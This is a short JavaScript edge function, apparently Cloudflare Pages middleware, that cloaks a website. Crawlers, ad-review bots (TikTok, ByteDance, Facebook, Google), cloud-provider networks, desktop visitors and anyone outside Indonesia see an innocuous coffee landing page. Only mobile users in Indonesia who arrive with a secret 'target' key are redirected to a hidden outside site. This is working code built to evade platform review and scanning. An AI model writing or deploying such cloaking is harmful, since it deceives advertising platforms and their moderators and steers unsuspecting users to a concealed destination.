export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
  const country = request.cf ? request.cf.country : 'Unknown';
  const asOrganization = request.cf ? request.cf.asOrganization : '';
  const targetKey = url.searchParams.get('target');
  if (targetKey !== 'sensa') {
    return next(); // Jika kunci salah/tidak ada, tampilkan LP Kopi aman
  }
  if (country !== 'ID') {
    return next();
  }
  const cloudProviders = ['amazon', 'google', 'digitalocean', 'microsoft', 'cloudflare', 'akamai', 'datacentre'];
  const isCloud = cloudProviders.some(provider => asOrganization.toLowerCase().includes(provider));
  if (isCloud) {
    return next();
  }
  const botList = /bot|spider|crawl|facebook|google|bing|slurp|yandex|adsbot|tiktok|bytedance|lighthouse/i;
  if (botList.test(userAgent)) {
    return next();
  }
  const isMobile = /android|iphone|ipad|mobile/i.test(userAgent);
  if (!isMobile) {
    return next();
  }
  return Response.redirect("https://sensawd.com/tiktokk", 302);
}